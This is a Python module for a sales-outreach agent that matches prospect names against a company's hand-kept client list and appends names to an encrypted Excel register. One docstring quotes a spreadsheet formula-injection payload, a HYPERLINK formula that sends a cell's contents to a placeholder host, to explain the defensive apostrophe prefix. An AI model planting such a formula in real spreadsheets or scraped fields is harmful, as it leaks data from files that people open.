"""SUPPLECO's active client list - the do-not-cold-email register.

The agent must never send a cold pitch to a company that is already a customer.
That is not a lost prospect, it is an existing commercial relationship being
handed an introduction to a supplier it already buys from.

Matching is by ORGANISATION NAME, because the source spreadsheet has no email
addresses - so the usual suppression list (keyed on address) cannot help. Names
are the only join available, and they are messy on both sides:

  the list       "A. MENARINI INDUSTRIE FARMACEUTICHE RIUNITE SRL"
  the website    "Menarini"

so a literal comparison matches almost nothing. The legal form alone is written
four ways in one file (SRL, S.R.L., S.R.L, SRLS).

Both failure directions cost something real, and they are not symmetrical:
emailing a client damages a live relationship, while over-blocking silently
drops a good prospect. So every block is LOGGED with the client it matched and
surfaced on the dashboard, making the decision auditable rather than invisible.
"""

import glob
import io
import logging
import os
import re
import shutil
import unicodedata
from pathlib import Path

logger = logging.getLogger(__name__)

BACKUP_COPIES = 5

# Legal forms, dropped before comparison. Matched as whole TOKENS, after the
# name has been split, rather than by a regex over the raw string.
#
# The regex approach failed on dot-written acronyms, which Italian companies
# use constantly. To absorb "SRL", "S.R.L." and "S.R.L" from one file, the
# pattern allowed an optional dot between every letter - which also let "SA"
# match the "S.A" inside "S.A.L.F. S.p.A.", strip it, and reduce that company
# to "L F". Two of its four identifying letters, gone. Tokenising first makes
# a legal form only ever match something that is actually a separate word.
_LEGAL_FORMS = frozenset(
    {
        "SRLS",
        "SRL",
        "SPA",
        "SNC",
        "SAS",
        "SS",
        "GMBH",
        "MBH",
        "AG",
        "KG",
        "OHG",
        "LTD",
        "LIMITED",
        "PLC",
        "LLC",
        "INC",
        "CORP",
        "BV",
        "NV",
        "SA",
        "SARL",
        "SAU",
        "SL",
        "OY",
        "AB",
        "AS",
        "APS",
        "ASA",
        "DOO",
        "ZOO",
        "SP",
        "KFT",
    }
)

# Letters with no NFKD decomposition: NFKD splits "é" into "e" + a combining
# mark that the next step drops, but "ø" and "æ" are atomic. They would survive
# to the [^A-Z0-9] filter and be deleted, splitting the word around them -
# "Frøya" became "FR YA", two fragments identifying nothing. The Nordic legal
# forms already in the list above (OY, AB, AS, ASA, APS) are a good sign such
# names are in the file.
_FOLD = {
    "Ø": "O",
    "Æ": "AE",
    "Œ": "OE",
    "Đ": "D",
    "Ð": "D",
    "Ł": "L",
    "Þ": "TH",
    "Ħ": "H",
    "Ŧ": "T",
}
_FOLD_RE = re.compile("|".join(map(re.escape, _FOLD)))

# "S.A.L.F.", "S.I.I.T" and "A.C.R.A.F." are one word written with dots, not
# four words. Collapsed before punctuation is flattened, whether or not the
# final letter carries a trailing dot, so the acronym survives as a single
# token instead of becoming single letters that are then discarded.
_DOTTED_ACRONYM_RE = re.compile(r"(?<!\w)([A-Z](?:\.[A-Z])+)\.?(?!\w)")

# Words that carry no identity: every second Italian pharma company contains
# them, so a match on one of these alone means nothing.
_GENERIC_TOKENS = {
    "INDUSTRIE",
    "INDUSTRIA",
    "INDUSTRIES",
    "FARMACEUTICHE",
    "FARMACEUTICI",
    "FARMACEUTICA",
    "PHARMA",
    "PHARMACEUTICAL",
    "PHARMACEUTICALS",
    "LABORATORI",
    "LABORATORIO",
    "LABORATORIES",
    "LAB",
    "LABS",
    "GRUPPO",
    "GROUP",
    "HOLDING",
    "HOLDINGS",
    "COMPANY",
    "CO",
    "ITALIA",
    "ITALY",
    "ITALIANA",
    "EUROPE",
    "EUROPA",
    "INTERNATIONAL",
    "RIUNITE",
    "ALIMENTARE",
    "ALIMENTARI",
    "PRODUCTS",
    "PRODOTTI",
    "SERVICE",
    "SERVIZI",
    "COMMERCIALE",
    "DISTRIBUZIONE",
    "AND",
    "E",
    "DI",
    "DE",
    "DEL",
    "DELLA",
    "THE",
    # The industry's own vocabulary. SUPPLECO sells INTO this sector, so these
    # words appear in a large share of both the client list and the prospect
    # list - which makes them worthless as identity even though they look
    # specific. One real client is named NUTRACEUTICA S.R.L., i.e. the Italian
    # word for the whole industry; without this, every company describing
    # itself as "nutraceutica italiana" matched it. A real contact at bdc28.it
    # was blocked that way.
    "NUTRACEUTICA",
    "NUTRACEUTICI",
    "NUTRACEUTICO",
    "NUTRACEUTICAL",
    "NUTRACEUTICALS",
    "INTEGRATORI",
    "INTEGRATORE",
    "SUPPLEMENT",
    "SUPPLEMENTS",
    "FOOD",
    "FOODS",
    "NUTRITION",
    "NUTRIZIONE",
    "HEALTH",
    "SALUTE",
    "BENESSERE",
    "WELLNESS",
    "COSMETIC",
    "COSMETICS",
    "COSMETICA",
    "COSMETICI",
    # Corporate descriptors, same class as PHARMA / GROUP / LABORATORI above.
    # Identity matching is EQUALITY, so any distinctive word on one side that
    # the other lacks is a miss - and a miss cold-emails a customer. Measured
    # against the real register: a site writing "<name> Biotech" instead of
    # "<name> Srl" missed 704/704 (100%) without these, and 0/704 with them.
    # The cost was measured too, against all 1000 scraped contacts in the
    # production database: no prospect is newly blocked and no client stops
    # being caught. The residual risk - "Alpha Biotech" collapsing onto a
    # client "Alpha Srl" - is the one already accepted for PHARMA and GROUP.
    "BIOTECH",
    "BIOTECHNOLOGY",
    "SCIENCE",
    "SCIENCES",
    "HEALTHCARE",
    "SOLUTIONS",
    "CARE",
    "RESEARCH",
    "INGREDIENTS",
}


def normalise(name: str) -> str:
    """Collapse a company name to comparable form.

    Accents folded, legal form dropped, punctuation reduced to single spaces,
    upper-cased. "Abbé Roland S.r.l." and "ABBE' ROLAND SRL" both become
    "ABBE ROLAND".
    """
    if not name:
        return ""
    text = str(name).upper()
    text = _FOLD_RE.sub(lambda m: _FOLD[m.group()], text)
    text = unicodedata.normalize("NFKD", text)
    text = "".join(ch for ch in text if not unicodedata.combining(ch))
    # Before punctuation is flattened, so "S.A.L.F." survives as one token.
    text = _DOTTED_ACRONYM_RE.sub(lambda m: m.group(1).replace(".", ""), text)
    text = re.sub(r"[^A-Z0-9]+", " ", text)
    return " ".join(t for t in text.split() if t not in _LEGAL_FORMS)


def _tokens(name: str) -> list:
    return [t for t in normalise(name).split() if t]


def _distinctive(name: str) -> set:
    """The tokens that actually identify a company.

    No minimum length. A short token is not a weak one - MSD, GSK, EOS, NU3 and
    IMO are among the most distinctive names in this file, and a four-character
    floor made all of them invisible. The floor existed to stop a single shared
    fragment forcing a match; that job now belongs to the matching rule, which
    compares whole identities rather than looking for overlap.

    Single characters are dropped, because they are initials rather than names:
    the "A." in "A. MENARINI ..." would otherwise stop it matching "Menarini".
    """
    return {t for t in _tokens(name) if t not in _GENERIC_TOKENS and len(t) > 1}


class ClientRegister:
    """Active clients, matched by organisation name."""

    def __init__(self, names):
        self.names = [n.strip() for n in names if n and str(n).strip()]
        self._by_norm = {}
        self._by_identity = {}
        self.unmatchable = []
        for n in self.names:
            norm = normalise(n)
            if not norm:
                # Nothing survives normalisation - a row holding only a legal
                # form, or only punctuation. It can never match anything, and a
                # client silently absent from the register is the failure this
                # module exists to prevent, so it is named rather than dropped.
                self.unmatchable.append(n)
                continue
            self._by_norm.setdefault(norm, n)
            identity = frozenset(_distinctive(n))
            if identity:
                self._by_identity.setdefault(identity, n)

    def __len__(self):
        return len(self.names)

    @property
    def matchable(self) -> int:
        """How many companies the register can actually screen out. None,
        and it protects no one: an empty sheet, or rows of legal forms only."""
        return len(self._by_norm)

    def match(self, organization: str) -> str | None:
        """The client this organisation is, or None.

        Whole-token throughout, never substring: the relevance filter and the
        lead scorer in this codebase both shipped bugs where a keyword matched
        inside a longer word ("news" in "newsletter", "coo" in "coordinator").

        Two names match when they have the SAME identity - the same set of
        distinctive tokens, once legal forms, industry vocabulary and country
        words are removed. "Menarini" and "A. MENARINI INDUSTRIE FARMACEUTICHE
        RIUNITE SRL" both reduce to {MENARINI}; "Abiogen Pharma" and "ABIOGEN
        PHARMA S.p.A." both to {ABIOGEN}.

        This replaced a subset rule - the shorter name's tokens all appearing
        in the longer one - which over-matched in both directions, because a
        subset needs only overlap, not agreement:

          org ⊆ client   "food.be" reduces to {FOOD}, a subset of DMF DIETETIC
                         METABOLIC FOOD's tokens, so an unrelated Belgian
                         company was dropped as a customer.
          client ⊆ org   AGAIN LIFE ITALIA reduces to {AGAIN, LIFE}, a subset
                         of "Born Again Life Sciences Ltd", so that prospect
                         was dropped too. Requiring two tokens did not help;
                         both are ordinary words.

        Equality is strict, so it leans on the generic-token list to absorb the
        decoration ("Italia", "Group", "Integratori") that one side writes and
        the other does not. That is a list a person can read and correct, which
        a similarity threshold is not - and every block is logged with the name
        it matched, so an operator can see the judgement and dispute it.
        """
        if not organization:
            return None
        norm = normalise(organization)
        if not norm:
            return None
        if norm in self._by_norm:
            return self._by_norm[norm]

        identity = frozenset(_distinctive(organization))
        if not identity:
            # Nothing identifying left - "Italia Srl", or a name made entirely
            # of industry words. Refusing to guess here is the difference
            # between a careful filter and one that blocks half the market.
            return None
        return self._by_identity.get(identity)


def load_from_xlsx(path, *, key: str) -> list:
    """Read the client names from the first column of the first sheet.

    key is LISTS_KEY: set, only an encrypted list is read, and only in
    memory; blank, only a plain one (modules/list_crypto.py). A list that
    cannot be read raises, so it is never taken for an empty one.
    """
    from modules.list_crypto import read_list

    return names_in(read_list(path, key))


def names_in(workbook: bytes) -> list:
    """The names in a workbook's bytes.

    Deliberately tolerant: the file is maintained by hand, so it may gain a
    header row, blank rows, or trailing spaces. It is a flat list of names
    today, with no header - anything that looks like one is skipped by the
    caller, not guessed at here.
    """
    from openpyxl import load_workbook

    wb = load_workbook(io.BytesIO(workbook), read_only=True, data_only=True)
    try:
        sheet = wb[wb.sheetnames[0]]
        names = []
        for row in sheet.iter_rows(min_col=1, max_col=1, values_only=True):
            value = row[0]
            if value is None:
                continue
            text = str(value).strip()
            if text:
                names.append(text)
        return names
    finally:
        wb.close()


def _cell_safe(name: str) -> str:
    """Defuse a company name before it becomes a spreadsheet cell.

    openpyxl writes any string starting with "=" as a live formula element, not
    as text - verified against the written XML, so this is not the CSV-import
    quirk but the real thing. And the name is not operator-typed: it comes from
    a scraped page's og:site_name or <title> (modules/search.py), which whoever
    owns that page controls completely.

    So a page titled `=HYPERLINK("http://x/?"&A1,"Open")` becomes a formula in
    SUPPLECO's real client register, which staff open in Excel. Leading "+", "-"
    and "@" are only dangerous on CSV import, which this path never uses, but
    they are prefixed too - the cost is one apostrophe and the rule is then one
    a reader can check without knowing which characters openpyxl special-cases.
    """
    text = str(name)
    if text[:1] in ("=", "+", "-", "@") or text[:1] in ("\t", "\r", "\n"):
        return "'" + text
    return text


def _stamp() -> str:
    from modules import clock

    return clock.now().strftime("%Y%m%d-%H%M%S")


def _backup_workbook(path: Path) -> Path:
    """Copy `path` to a dated backup next to it, keeping the newest BACKUP_COPIES."""
    stamp = _stamp()
    backup = path.with_name(f"{path.stem}.backup-{stamp}{path.suffix}")
    seq = 1
    while backup.exists():
        backup = path.with_name(f"{path.stem}.backup-{stamp}_{seq:02d}{path.suffix}")
        seq += 1
    try:
        shutil.copy2(path, backup)
    except BaseException:
        backup.unlink(missing_ok=True)
        raise
    copies = sorted(
        path.parent.glob(f"{glob.escape(path.stem)}.backup-*{path.suffix}")
    )
    for old in copies[:-BACKUP_COPIES]:
        old.unlink(missing_ok=True)
    return backup


def _close_open_zip(tb) -> None:
    """Close any ZipFile that openpyxl's save_workbook left open on error."""
    import zipfile

    while tb is not None:
        arc = tb.tb_frame.f_locals.get("archive")
        if isinstance(arc, zipfile.ZipFile) and getattr(arc, "fp", None) is not None:
            arc.fp.close()
            arc.fp = None
        tb = tb.tb_next


def append_to_xlsx(path, name: str, *, key: str) -> bool:
    """Add one company to the list. True if it was added.

    Idempotent on the normalised name, so marking the same company twice - or
    marking one whose legal form is punctuated differently from the existing
    row - does not create a duplicate. Copies the file to a dated backup next
    to it first, then writes to a temporary file in the same folder and swaps
    it in with os.replace, so a crash or a full disk never leaves a damaged
    workbook. With LISTS_KEY (key) the list is changed in memory and written
    back encrypted, and its backup is the encrypted file as it was: no plain
    copy touches the disk.
    """
    from openpyxl import load_workbook

    from modules.list_crypto import read_list, seal

    path = Path(path)
    workbook = read_list(path, key)
    existing = {normalise(n) for n in names_in(workbook)}
    if normalise(name) in existing:
        logger.info("%r is already on the client list", name)
        return False

    _backup_workbook(path)
    tmp = path.with_name(f"{path.stem}.tmp-{os.getpid()}{path.suffix}")
    try:
        wb = load_workbook(io.BytesIO(workbook))
        try:
            sheet = wb[wb.sheetnames[0]]
            sheet.cell(row=sheet.max_row + 1, column=1, value=_cell_safe(name))
            saved = io.BytesIO()
            wb.save(saved)
        finally:
            wb.close()
        tmp.write_bytes(seal(saved.getvalue(), key))
        os.replace(tmp, path)
    except BaseException as exc:
        _close_open_zip(exc.__traceback__)
        tmp.unlink(missing_ok=True)
        raise
    logger.info("Added %r to the client list", name)
    return True
